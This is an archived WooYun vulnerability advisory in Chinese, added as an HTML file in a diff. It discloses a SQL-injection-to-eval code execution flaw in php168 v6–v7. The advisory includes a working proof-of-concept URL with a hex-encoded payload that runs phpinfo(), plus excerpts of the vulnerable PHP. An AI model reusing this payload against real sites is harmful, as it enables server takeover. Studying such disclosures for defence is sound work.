@@ -1,0 +1,185 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		php168 v6~v7鸡肋Getshell安全问题  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		php168 v6~v7鸡肋Getshell安全问题  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/网络达人">网络达人</a> 
+</li><li>提交时间：		2012-09-18 20:55</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-09-18：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-09-18：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">php168 v6~v7 部分脚本过滤不导致可以获取WEBSHELL</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">有点鸡肋，需要条件：<br />
+<br />
+1.网站配置为：文章生成真静态<br />
+<br />
+2.允许注册会员<br />
+<br />
+<br />
+<br />
+给出v6的测试代码，提交后执行phpinfo()，v7原理一样，只是数据库字段数不一样。<br />
+<br />
+<br />
+<br />
+</p><pre><code>member/list.php?step=2&amp;Type=delete&amp;aidDB[]=-1)%20union%20select%201,2,3,4,5,6,7,8,9,10,1,2,3,4,15,6,7,8,9,10,1,2,3,4,25,6,7,8,9,10,1,2,3,4,35,6,7,8,9,10,1,2,3,4,45,6,7,8,9,10,1,2,3,4,0x7B247B706870696E666F28297D7D,6,7%23</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+漏洞在make_more_article_html这个函数：<br />
+<br />
+</p><pre><code>function make_more_article_html($comebackurl=&#039;/&#039;,$type=&#039;&#039;,$aidDB=&#039;&#039;){<br />
+global $db,$pre,$webdb,$webdb,$showHtml_Type;<br />
+if($webdb[NewsMakeHtml]!=1||$aidDB==&#039;&#039;)  // $webdb[NewsMakeHtml] 真静态<br />
+{ return ;}<br />
+...<br />
+$query = $db-&gt;query(&quot;SELECT A.*,B.bencandy_html,B.list_html,D.aid FROM {$pre}article_db D LEFT JOIN  {$pre}article A ON D.aid=A.aid LEFT JOIN {$pre}sort B ON A.fid=B.fid WHERE D.aid IN ($string)&quot;);<br />
+while($rs = $db-&gt;fetch_array($query)){<br />
+...<br />
+$filename_b=$rs[bencandy_html];<br />
+...<br />
+eval(&quot;\$showurl=\&quot;$filename_b\&quot;;&quot;);<br />
+...</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ 在 \member\list.php中调用了该漏洞函数：<br />
+<br />
+</p><pre><code>if($step==2){<br />
+...<br />
+if($Type==&#039;delete&#039;){<br />
+  make_more_article_html(&quot;$FROMURL&quot;,&quot;del_0&quot;,$aidDB);</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/网络达人" title="网络达人">网络达人</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-012369" title="php168 v6~v7鸡肋Getshell安全问题">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="12369";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
